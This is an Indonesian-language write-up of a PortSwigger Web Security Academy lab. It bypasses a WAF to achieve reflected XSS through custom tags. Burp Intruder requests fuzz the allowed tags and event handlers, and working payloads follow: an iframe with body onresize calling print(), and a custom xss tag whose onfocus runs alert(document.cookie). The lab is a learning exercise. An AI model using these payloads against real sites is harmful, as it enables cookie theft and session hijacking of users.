# Reflected XSS dalam Konteks HTML dengan Semua Tag Diblokir Kecuali Tag Kustom

Lab ini mengandung kerentanan **Reflected Cross-Site Scripting (XSS)** pada fungsi pencarian, namun dilindungi oleh **Web Application Firewall (WAF)** yang memblokir semua tag HTML kecuali tag kustom. 

Untuk menyelesaikan lab ini, Anda perlu melakukan serangan cross-site scripting yang menyuntikkan tag kustom dan secara otomatis memanggil fungsi `alert(document.cookie)`.

---------------------------------------------

## Referensi:

- [PortSwigger: Contexts in XSS](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [PortSwigger: XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

---------------------------------------------

## Langkah-Langkah Eksploitasi

### 1. Mengidentifikasi Kerentanan Reflected XSS pada Fungsi Pencarian

Pertama, kita perlu memastikan bahwa terdapat kerentanan XSS pada fungsi pencarian. Konten pencarian akan direfleksikan di dalam elemen `<h1>` HTML.

**Payload Awal untuk Menguji XSS:**

```html
<img src=1 onerror=print()>
```

**Pengamatan:** Payload ini diblokir oleh WAF.

![Langkah 1](images/Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones/1.png)

### 2. Menggunakan Burp Intruder untuk Menguji Tag dan Atribut yang Diblokir

Kita akan menggunakan **Burp Suite Intruder** untuk menguji tag dan atribut mana yang diblokir oleh WAF.

#### a. Mengirim Permintaan GET dengan Payload Posisi

Kirim permintaan GET berikut menggunakan Burp Suite:

```plaintext
GET /?search=<§§> HTTP/2
Host: 0aea005104d1419c805a3fe60055007f.web-security-academy.net
Cookie: session=9FSUj13f4MvEvCHHqnpyuvyXNGkFU3de
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aea005104d1419c805a3fe60055007f.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

**Instruksi:**
1. **Buka Burp Suite dan Konfigurasikan Proxy:**
   - Pastikan browser Anda terhubung dengan Burp Suite melalui proxy.
   
2. **Gunakan Fungsi Pencarian di Lab:**
   - Masuk ke aplikasi web lab dan gunakan fungsi pencarian dengan memasukkan payload standar yang telah diblokir sebelumnya.
   
3. **Tangkap Permintaan di Burp Proxy:**
   - Permintaan pencarian akan ditangkap oleh Burp Suite. Kirimkan permintaan tersebut ke **Burp Intruder** dengan mengklik kanan pada permintaan dan memilih `Send to Intruder`.

#### b. Menyiapkan Payload Positions

1. **Ganti Nilai Istilah Pencarian:**
   - Di **Burp Intruder**, ubah nilai dari istilah pencarian menjadi `<>`.
   
   ```plaintext
   <§§>
   ```
   
2. **Buat Posisi Payload:**
   - Tempatkan kursor di antara tanda kurung siku (`<>`) dan klik tombol **Add §** untuk membuat posisi payload.
   - Hasilnya, nilai istilah pencarian akan terlihat seperti ini: `<§§>`

#### c. Menyalin Tag dari Cheat Sheet

1. **Kunjungi [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).**
2. **Klik "Copy tags to clipboard":**
   - Ini akan menyalin daftar tag yang dapat digunakan untuk pengujian lebih lanjut.

#### d. Menempelkan Tag ke Burp Intruder

1. **Di Panel Payloads:**
   - Di bawah **Payload Configuration**, klik tombol **Paste** untuk menempelkan daftar tag yang telah disalin ke dalam daftar payload.
2. **Mulai Serangan:**
   - Klik tombol **Start attack** untuk memulai serangan.

#### e. Mengamati Hasil Serangan

- **Hasil yang Diharapkan:**
  - Sebagian besar payload akan menghasilkan respons **400 Bad Request**.
  - Payload dengan tag `<body>` menghasilkan respons **200 OK**.

![Langkah 2](images/Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones/2.png)

![Langkah 3](images/Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones/3.png)

### 3. Menguji Atribut yang Diperbolehkan

Setelah mengetahui bahwa tag `<body>` diterima, kita akan menguji atribut yang diperbolehkan untuk memanggil fungsi `print()`.

#### a. Mengirim Permintaan GET dengan Payload Atribut Event

Kirim permintaan GET berikut menggunakan Burp Suite:

```plaintext
GET /?search=<body%20§§=1> HTTP/2
Host: 0aea005104d1419c805a3fe60055007f.web-security-academy.net
Cookie: session=9FSUj13f4MvEvCHHqnpyuvyXNGkFU3de
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aea005104d1419c805a3fe60055007f.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

**Instruksi:**
1. **Di Burp Intruder, Ganti Nilai Istilah Pencarian:**
   - Ubah nilai pencarian menjadi `<body%20§§=1>`.
   
2. **Buat Posisi Payload:**
   - Tempatkan kursor sebelum karakter `=` dan klik tombol **Add §** untuk membuat posisi payload.
   - Hasilnya, nilai istilah pencarian akan terlihat seperti ini: `<body%20§§=1>`

#### b. Menyalin Atribut dari Cheat Sheet

1. **Kunjungi kembali [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).**
2. **Klik "Copy events to clipboard":**
   - Ini akan menyalin daftar atribut event yang dapat digunakan untuk pengujian lebih lanjut.

#### c. Menempelkan Atribut ke Burp Intruder

1. **Di Panel Payloads:**
   - Klik tombol **Clear** untuk menghapus payload sebelumnya.
   - Klik tombol **Paste** untuk menempelkan daftar atribut event yang telah disalin ke dalam daftar payload.
2. **Mulai Serangan:**
   - Klik tombol **Start attack** untuk memulai serangan.

#### d. Mengamati Hasil Serangan

- **Hasil yang Diharapkan:**
  - Sebagian besar payload akan menghasilkan respons **400 Bad Request**.
  - Payload dengan atribut `onresize` menghasilkan respons **200 OK**.

![Langkah 4](images/Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones/4.png)

### 4. Menyusun dan Mengirimkan Payload Akhir melalui Iframe

Setelah mengetahui bahwa atribut `onresize` diperbolehkan, susun payload akhir untuk memanggil fungsi `print()` secara otomatis tanpa interaksi pengguna.

#### a. Menyusun Payload Iframe

**Kode Payload:**

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload="body.style.width='100px'"></iframe>
```

**Instruksi:**

1. **Ganti `YOUR-LAB-ID` dengan ID lab Anda:**
   - Contoh: Jika ID lab Anda adalah `0aea005104d1419c805a3fe60055007f`, maka URL akan menjadi `https://0aea005104d1419c805a3fe60055007f.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E`.

2. **Sisipkan Kode Iframe ke dalam Fungsi Pencarian:**
   - Masukkan kode iframe di atas ke dalam fungsi pencarian dan kirimkan permintaan tersebut.

3. **Kirimkan Exploit ke Korban:**
   - Klik **"Store"** dan kemudian **"Deliver exploit to victim"** untuk menyampaikan exploit kepada korban.

#### b. Menambahkan Payload Tambahan untuk Menangkap Cookie

Selain payload sebelumnya, Anda juga dapat menambahkan payload berikut untuk menangkap cookie korban menggunakan event `onfocus` pada tag kustom `<xss>`.

**Kode Payload:**

```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex=1%3E#x';
</script>
```

**Instruksi:**

1. **Ganti `YOUR-LAB-ID` dengan ID lab Anda:**
   - Contoh: Jika ID lab Anda adalah `0aea005104d1419c805a3fe60055007f`, maka URL akan menjadi `https://0aea005104d1419c805a3fe60055007f.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex=1%3E#x`.

2. **Sisipkan Kode Script ke dalam Eksploit Server:**
   - Buka **Exploit Server** di platform lab.
   - Paste kode script di atas ke dalam kolom yang disediakan, mengganti `YOUR-LAB-ID` dengan ID lab Anda.

3. **Kirimkan Exploit ke Korban:**
   - Klik **"Store"** dan kemudian **"Deliver exploit to victim"** untuk menyampaikan exploit kepada korban.

**Penjelasan:**
- **Tag Kustom `<xss>` dengan Atribut `onfocus`:**
  - Payload ini membuat tag kustom `<xss>` dengan ID `x` yang memiliki event handler `onfocus` yang akan memicu fungsi `alert(document.cookie)` ketika elemen tersebut difokuskan.
  
- **Hash `#x` di URL:**
  - Hash pada akhir URL `#x` secara otomatis memfokuskan pada elemen dengan ID `x` ketika halaman dimuat, sehingga memicu event `onfocus` dan menjalankan payload `alert(document.cookie)` tanpa memerlukan interaksi pengguna.

### 5. Memverifikasi Eksekusi Payload

Setelah mengirimkan payload, verifikasi apakah fungsi `print()` dan `alert(document.cookie)` telah dipanggil secara otomatis tanpa interaksi pengguna dengan cara berikut:

- **Memeriksa Dialog Cetak:**
  - Jika fungsi `print()` berhasil dipanggil, dialog cetak browser akan muncul secara otomatis.
  
- **Melihat Log Aktivitas di Konsol Browser:**
  - Buka konsol pengembang di browser dan periksa apakah ada pesan atau aktivitas yang terkait dengan pemanggilan fungsi `print()` dan `alert(document.cookie)`.

![Langkah 5](images/Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones/5.png)

![Langkah 6](images/Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones/6.png)

## Penjelasan

**Reflected Cross-Site Scripting (XSS)** adalah jenis kerentanan di mana skrip berbahaya disuntikkan ke dalam respons HTTP langsung melalui input pengguna. Dalam kasus ini, skrip dijalankan di dalam konteks HTML dengan semua tag standar diblokir oleh WAF kecuali tag kustom yang diperbolehkan.

### Mengatasi Pembatasan WAF

WAF sering kali memblokir tag dan atribut yang umum digunakan untuk serangan XSS, seperti `<script>`, `onerror`, dan lain-lain. Namun, beberapa event handler masih diperbolehkan, seperti `onbeforeinput`, `onratechange`, `onscrollend`, dan `onresize`. Dengan memanfaatkan event handler ini pada tag yang diperbolehkan seperti `<body>` dan tag kustom `<xss>`, kita dapat menjalankan skrip berbahaya.

### Payload Iframe dengan Event `onresize`

Dengan menggunakan tag `<body>` dan atribut `onresize`, kita dapat memanggil fungsi `print()` secara otomatis. Untuk memicu event `resize` tanpa interaksi pengguna, kita menyisipkan iframe yang memuat halaman dengan payload XSS dan menggunakan event `onload` pada iframe untuk mengubah gaya `body`, yang akan memicu event `resize`.

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload="body.style.width='100px'"></iframe>
```

### Payload Script dengan Event `onfocus`

Selain itu, dengan menggunakan tag kustom `<xss>` dan atribut `onfocus`, kita dapat menjalankan fungsi `alert(document.cookie)` secara otomatis ketika elemen tersebut difokuskan melalui hash di URL.

```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex=1%3E#x';
</script>
```

### Pentingnya Validasi dan Sanitasi Input

Kerentanan XSS dapat digunakan untuk menjalankan skrip berbahaya dalam konteks pengguna yang terautentikasi, memungkinkan penyerang untuk melakukan berbagai tindakan tidak sah seperti mencuri cookie, mengubah konten halaman, atau melakukan tindakan lain atas nama pengguna. Oleh karena itu, sangat penting untuk selalu memvalidasi dan menyaring input pengguna di sisi server untuk mencegah penyuntikan skrip berbahaya.

## Kesimpulan

Eksploitasi **Reflected XSS** dalam konteks HTML dengan pembatasan WAF memerlukan kreativitas dalam memilih tag dan atribut yang masih diperbolehkan. Dengan memanfaatkan event handler yang tersedia dan teknik seperti penggunaan iframe serta tag kustom, penyerang dapat menjalankan skrip berbahaya seperti memanggil fungsi `print()` dan `alert(document.cookie)` tanpa memerlukan interaksi pengguna. Penting untuk selalu menerapkan praktik keamanan terbaik, seperti sanitasi input dan konfigurasi WAF yang tepat, untuk mencegah kerentanan ini.

## Referensi Tambahan

- [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
